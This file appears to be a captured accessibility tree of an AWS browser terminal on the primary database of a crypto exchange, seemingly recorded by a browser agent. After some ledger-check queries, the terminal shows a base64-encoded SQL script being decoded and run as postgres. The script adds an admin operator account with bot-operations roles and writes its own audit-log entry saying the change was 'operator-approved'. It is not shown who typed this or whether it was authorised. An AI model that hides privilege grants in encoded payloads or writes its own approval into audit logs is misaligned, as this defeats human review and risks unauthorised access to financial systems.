@@ -1,0 +1,100 @@
+Browser tab: 2017667318, Title: "EC2 Instance Connect | ap-northeast-2", URL: "https://ap-northeast-2.console.aws.amazon.com/ec2-instance-connect/ssh/home?region=ap-northeast-2&connType=standard&instanceId=i-0e302764af73d861f&osUser=ec2-user&sshPort=22&addressFamily=ipv4".
+0 AXWebArea EC2 Instance Connect | ap-northeast-2, URL: ap-northeast-2.console.aws.amazon.com/ec2-instance-connect/ssh/home?region=ap-northeast-2&connType=standard&instanceId=i-0e302764af73d861f&osUser=ec2-user&sshPort=22&addressFamily=ipv4
+	1 container b
+		36 container consoleNavHeader
+			37 container awsc-nav-header
+				38 image Account color: 설정 해제
+				39 container Global
+					40 container awsc-top-level-nav
+						41 link Description: AWS 콘솔 홈, Value: ap-northeast-2.console.aws.amazon.com/console/home?region=ap-northeast-2, ID: nav-home-link
+						42 link Description: Skip to Main Content, Value: ap-northeast-2.console.aws.amazon.com/ec2-instance-connect/ssh/home?region=ap-northeast-2&connType=standard&instanceId=i-0e302764af73d861f&osUser=ec2-user&sshPort=22&addressFamily=ipv4#c
+						43 button (collapsed) Description: Services, Secondary Actions: Expand
+							44 image
+						45 container aws-unified-search-container
+							46 container
+								47 image Search
+								48 combo box (collapsed, settable) Description: Search, ID: awsc-concierge-input, Secondary Actions: Expand
+								49 button Ask Amazon Q
+								50 text [Alt+S]
+						51 link Description: CloudShell, Value: ap-northeast-2.console.aws.amazon.com/cloudshell/home?region=ap-northeast-2, ID: awsc-nav-scallop-icon
+						52 container
+							53 pop up button Description: Notifications (none available), Help: Notifications
+								54 image Notifications
+							55 image Notifications
+						56 content list awsc-navigation__more-menu--list
+							57 button (collapsed) Description: Help & support, Secondary Actions: Expand
+								58 image Support
+							59 button (collapsed) Description: Settings, Secondary Actions: Expand
+							60 combo box (collapsed) Description: Regions (아시아 태평양 (서울)), Value: 아시아 태평양 (서울), Secondary Actions: Expand
+								61 text 아시아 태평양 (서울)
+							62 button (collapsed) Description: 2026-ai-kopo-04 @ 6192-5696-4117, ID: nav-usernameMenu, Secondary Actions: Expand
+								63 text Account ID: 6192-5696-4117
+								64 text 2026-ai-kopo-04
+		12 container
+			13 container Notifications
+				14 content list Description: Notifications, ID: flashbar1-1789830838246-7422
+			15 text Content loaded
+			65 container
+				66 content list
+					91 text  symbol  | trades |         last_trade         
+					92 text ---------+--------+----------------------------
+					93 text  KRW-BTC |    342 | 2026-09-19 15:14:56.721+00
+					94 text  KRW-ETH |      7 | 2026-09-19 15:14:55.719+00
+					95 text  KRW-XRP |      4 | 2026-09-19 15:14:56.388+00
+					96 text (3 rows)
+					97 text  balance_mismatches 
+					98 text --------------------
+					99 text                   0
+					100 text (1 row)
+					101 text  asset_id |      ledger_net      
+					102 text ----------+----------------------
+					103 text         3 | 0.000000000000000000
+					104 text         5 | 0.000000000000000000
+					105 text         2 | 0.000000000000000000
+					106 text         1 | 0.000000000000000000
+					107 text (4 rows)
+					108 text    state   | sync_state | replay_bytes 
+					109 text -----------+------------+--------------
+					110 text  streaming | async      |            0
+					111 text (1 row)
+					112 text [ec2-user@ip-172-31-1-229 ~]$ printf '%s' 'XHNldCBPTl9FUlJPUl9TVE9QIG9uCkJFR0lOOwpJTlNFUlQgSU5UTyBhZG1p
+					113 text bl9vcGVyYXRvcnMgKG9wZXJhdG9yX2lkLCBkaXNwbGF5X25hbWUpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICfsnbT
+					114 text sg4HtmIEgwrcg7Iuc7J6lIOu0hyDsmrTsmIEnKQpPTiBDT05GTElDVCAob3BlcmF0b3JfaWQpIERPIE5PVEhJTkc7CklOU0VSVCBJTl
+					115 text RPIG9wZXJhdG9yX3JvbGVzIChvcGVyYXRvcl9pZCwgcm9sZSkKVkFMVUVTICgnc2FuZ2h5dWstYm90LW9wZXJhdG9yJywgJ1ZJRVdFU
+					116 text icpLCAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdCT1RfT1BTJykKT04gQ09ORkxJQ1QgKG9wZXJhdG9yX2lkLCByb2xlKSBETyBO
+					117 text T1RISU5HOwpJTlNFUlQgSU5UTyBhZG1pbl9hdWRpdF9sb2cgKG9wZXJhdG9yX2lkLCBhY3Rpb24sIHRhcmdldCwgcmVzdWx0LCBkZXR
+					118 text haWwpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdvcGVyYXRvci5ib290c3RyYXAnLCAnc2FuZ2h5dWstYm90LW9wZX
+					119 text JhdG9yJywgJ09LJywKICAgICAgICAneyJyb2xlcyI6WyJWSUVXRVIiLCJCT1RfT1BTIl0sIm1ldGhvZCI6Im9wZXJhdG9yLWFwcHJvd
+					120 text mVkIFNRTCJ9Jyk7CkNPTU1JVDsK' | base64 -d > /tmp/register-bot-operator.sql
+					121 text [ec2-user@ip-172-31-1-229 ~]$ sudo -u postgres psql -d exchange -f /tmp/register-bot-operator.sql
+					122 text BEGIN
+					123 text INSERT 0 1
+					124 text INSERT 0 2
+					125 text INSERT 0 1
+					126 text COMMIT
+					127 text [ec2-user@ip-172-31-1-229 ~]$ 
+				128 text l9vcGVyYXRvcnMgKG9wZXJhdG9yX2lkLCBkaXNwbGF5X25hbWUpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICfsnbTsg4HtmIEgwrcg7Iuc7J6lIOu0hyDsmrTsmIEnKQpPTiBDT05GTElDVCAob3BlcmF0b3JfaWQpIERPIE5PVEhJTkc7CklOU0VSVCBJTlRPIG9wZXJhdG9yX3JvbGVzIChvcGVyYXRvcl9pZCwgcm9sZSkKVkFMVUVTICgnc2FuZ2h5dWstYm90LW9wZXJhdG9yJywgJ1ZJRVdFUicpLCAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdCT1RfT1BTJykKT04gQ09ORkxJQ1QgKG9wZXJhdG9yX2lkLCByb2xlKSBETyBOT1RISU5HOwpJTlNFUlQgSU5UTyBhZG1pbl9hdWRpdF9sb2cgKG9wZXJhdG9yX2lkLCBhY3Rpb24sIHRhcmdldCwgcmVzdWx0LCBkZXRhaWwpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdvcGVyYXRvci5ib290c3RyYXAnLCAnc2FuZ2h5dWstYm90LW9wZXJhdG9yJywgJ09LJywKICAgICAgICAneyJyb2xlcyI6WyJWSUVXRVIiLCJCT1RfT1BTIl0sIm1ldGhvZCI6Im9wZXJhdG9yLWFwcHJvdmVkIFNRTCJ9Jyk7CkNPTU1JVDsK' | base64 -d > /tmp/register-bot-operator.sqlprintf '%s' 'XHNldCBPTl9FUlJPUl9TVE9QIG9uCkJFR0lOOwpJTlNFUlQgSU5UTyBhZG1pbl9vcGVyYXRvcnMgKG9wZXJhdG9yX2lkLCBkaXNwbGF5X25hbWUpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICfsnbTsg4HtmIEgwrcg7Iuc7J6lIOu0hyDsmrTsmIEnKQpPTiBDT05GTElDVCAob3BlcmF0b3JfaWQpIERPIE5PVEhJTkc7CklOU0VSVCBJTlRPIG9wZXJhdG9yX3JvbGVzIChvcGVyYXRvcl9pZCwgcm9sZSkKVkFMVUVTICgnc2FuZ2h5dWstYm90LW9wZXJhdG9yJywgJ1ZJRVdFUicpLCAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdCT1RfT1BTJykKT04gQ09ORkxJQ1QgKG9wZXJhdG9yX2lkLCByb2xlKSBETyBOT1RISU5HOwpJTlNFUlQgSU5UTyBhZG1pbl9hdWRpdF9sb2cgKG9wZXJhdG9yX2lkLCBhY3Rpb24sIHRhcmdldCwgcmVzdWx0LCBkZXRhaWwpClZBTFVFUyAoJ3NhbmdoeXVrLWJvdC1vcGVyYXRvcicsICdvcGVyYXRvci5ib290c3RyYXAnLCAnc2FuZ2h5dWstYm90LW9wZXJhdG9yJywgJ09LJywKICAgICAgICAneyJyb2xlcyI6WyJWSUVXRVIiLCJCT1RfT1BTIl0sIm1ldGhvZCI6Im9wZXJhdG9yLWFwcHJvdmVkIFNRTCJ9Jyk7CkNPTU1JVDsK' | base64 -d > /tmp/register-bot-operator.sql [ec2-user@ip-172-31-1-229 ~]$ sudo -u postgres psql -d exchange -f /tmp/register-bot-operator.sqlsudo -u postgres psql -d exchange -f /tmp/register-bot-operator.sql BEGIN INSERT 0 1 INSERT 0 2 INSERT 0 1 COMMIT [ec2-user@ip-172-31-1-229 ~]$
+				80 text field (settable) Terminal input
+			23 button Close instance info
+			81 heading i-0e302764af73d861f (2026-ai-kopo-04-db-primary-01), Value: 3
+				82 text i-0e302764af73d861f (2026-ai-kopo-04-db-primary-01)
+			83 container
+				84 text PublicIPs: 13.125.150.154 PrivateIPs: 172.31.1.229
+		26 container f
+			27 container console-nav-footer
+				28 container awsc-nav-footer-content
+					85 button CloudShell, Help: Open CloudShell, ID: tools-experience-ingress
+					29 button Agent Toolkit for AWS
+					86 button Feedback, ID: feedback
+						87 text Feedback
+					30 button Console Mobile App, ID: mobile_app_button
+						31 image
+						88 text Console Mobile App
+					89 container
+						90 text ©  2026 ,  Amazon Web Services, Inc. or its affiliates.
+					32 content list
+						33 link Description: Privacy, Value: aws.amazon.com/privacy/
+						34 link Description: Terms, Value: aws.amazon.com/terms/
+						35 button Cookie preferences
+
+The focused UI element is 80 text field (settable) Terminal input
